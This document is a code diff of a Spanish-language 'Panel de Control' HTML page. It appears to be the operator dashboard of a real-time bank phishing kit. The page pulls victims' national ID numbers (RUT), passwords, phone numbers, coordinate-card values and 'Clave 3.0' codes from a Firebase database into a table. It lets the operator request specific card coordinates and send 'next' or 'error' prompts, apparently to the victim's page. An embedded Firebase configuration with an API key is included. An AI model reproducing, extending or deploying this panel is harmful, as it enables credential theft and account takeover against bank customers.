@@ -1,61 +1,86 @@
-
 <!DOCTYPE html>
-<html lang="es">
+<html>
 <head>
-  <meta charset="UTF-8">
   <title>Panel de Control</title>
+  <meta charset="utf-8" />
   <style>
     body {
       font-family: Arial, sans-serif;
       padding: 20px;
     }
-    h2 {
-      color: #333;
-    }
-    .fila {
+    .switch {
       margin-bottom: 20px;
     }
-    input[type="text"] {
-      width: 40px;
+    #estadoPanel.activo {
+      color: green;
+      font-weight: bold;
+    }
+    #estadoPanel.inactivo {
+      color: red;
+      font-weight: bold;
+    }
+    table {
+      width: 100%;
+      border-collapse: collapse;
+      margin-top: 20px;
+    }
+    th, td {
+      border: 1px solid #ccc;
       padding: 8px;
-      font-size: 16px;
-      text-align: center;
-      margin-right: 10px;
+      font-size: 14px;
     }
-    button {
-      padding: 10px 20px;
-      font-size: 16px;
-      margin-right: 10px;
+    th {
+      background-color: #eee;
     }
-    .coordenadas-panel {
-      display: flex;
-      gap: 10px;
-      margin-bottom: 10px;
+    tr:nth-child(even) {
+      background-color: #f9f9f9;
     }
   </style>
+  <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-database-compat.js"></script>
 </head>
 <body>
   <h2>Panel de Control</h2>
 
-  <div class="fila">
-    <strong>Coordenadas a solicitar:</strong>
-    <div class="coordenadas-panel">
-      <input type="text" id="coord1" maxlength="2" />
-      <input type="text" id="coord2" maxlength="2" />
-      <input type="text" id="coord3" maxlength="2" />
-    </div>
-    <button onclick="actualizarCoordenadas()">Guardar Coordenadas</button>
+  <div class="switch">
+    <label>Modo Asistente: <span id="estadoPanel" class="inactivo">INACTIVO</span></label>
+    
+        <button onclick="toggleModo()">Activar / Desactivar</button>
+        <button onclick="setEstado('siguiente')">✅ Siguiente</button>
+        <button onclick="setEstado('error')">❌ Datos Incorrectos</button>
+        <button onclick="setEstado('reset')">🔁 Reset</button>
+        
   </div>
 
-  <div class="fila">
-    <button onclick="setEstado('siguiente')">✅ Siguiente</button>
-    <button onclick="setEstado('error')">❌ Datos ingresados Incorrectamente</button>
+  <table>
+    <thead>
+      <tr>
+        <th>Fecha y Hora</th>
+        <th>RUT</th>
+        <th>Contraseña</th>
+        <th>Teléfono</th>
+        <th>Coordenadas</th>
+        <th>Clave 3.0</th>
+      </tr>
+    </thead>
+    <tbody id="tablaDatos"></tbody>
+  </table>
+  <div style="margin-top: 20px;">
+    <label><strong>Coordenadas solicitadas (ej: A1 B2 C3):</strong></label><br />
+    <input id="inputCoords" type="text" style="padding: 5px; width: 300px;" oninput="setCoordenadasSolicitadas(this.value)" />
   </div>
 
-  <div id="info"></div>
+  <script>
+    function setCoordenadasSolicitadas(valor) {
+      firebase.database().ref('coordenadas_solicitadas').set(valor);
+    }
 
-  <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
-  <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-database-compat.js"></script>
+    firebase.database().ref('coordenadas_solicitadas').on('value', snap => {
+      document.getElementById("inputCoords").value = snap.val() || "";
+    });
+  </script>
+
+
   <script>
     const firebaseConfig = {
       apiKey: "AIzaSyBdPWoveN6ftUuIsUtnF1hA5eB7UWZR8aQ",
@@ -66,21 +91,51 @@
       messagingSenderId: "604053438195",
       appId: "1:604053438195:web:188de91bee9a62f0d3c186"
     };
+
     firebase.initializeApp(firebaseConfig);
     const db = firebase.database();
 
-    function setEstado(valor) {
-      db.ref("validacion_estado").set(valor);
+    function toggleModo() {
+      db.ref("modo_asistente").once("value").then(snapshot => {
+        const nuevoValor = !snapshot.val();
+        db.ref("modo_asistente").set(nuevoValor);
+      });
     }
 
-    function actualizarCoordenadas() {
-      const c1 = document.getElementById("coord1").value.trim().toUpperCase();
-      const c2 = document.getElementById("coord2").value.trim().toUpperCase();
-      const c3 = document.getElementById("coord3").value.trim().toUpperCase();
-      const valor = [c1, c2, c3].join(" ");
-      db.ref("coordenadas_solicitadas").set(valor);
-      document.getElementById("info").textContent = "✅ Coordenadas actualizadas: " + valor;
-    }
+    db.ref("modo_asistente").on("value", snap => {
+      const estado = snap.val();
+      const estadoEl = document.getElementById("estadoPanel");
+      if (estado) {
+        estadoEl.textContent = "ACTIVO";
+        estadoEl.className = "activo";
+      } else {
+        estadoEl.textContent = "INACTIVO";
+        estadoEl.className = "inactivo";
+      }
+    });
+
+    db.ref("usuarios").on("value", snap => {
+      const tabla = document.getElementById("tablaDatos");
+      tabla.innerHTML = "";
+      const usuarios = snap.val();
+      if (usuarios) {
+        const ordenados = Object.entries(usuarios).sort((a, b) => {
+          return new Date(b[1].hora || "") - new Date(a[1].hora || "");
+        });
+        ordenados.forEach(([key, val]) => {
+          const row = document.createElement("tr");
+          row.innerHTML = `
+            <td>${val.hora || ""}</td>
+            <td>${val.rut || ""}</td>
+            <td>${val.clave || ""}</td>
+            <td>${val.telefono || ""}</td>
+            <td>${val.coordenadas || ""}</td>
+            <td>${val.clave30 || ""}</td>
+          `;
+          tabla.appendChild(row);
+        });
+      }
+    });
   </script>
 </body>
 </html>
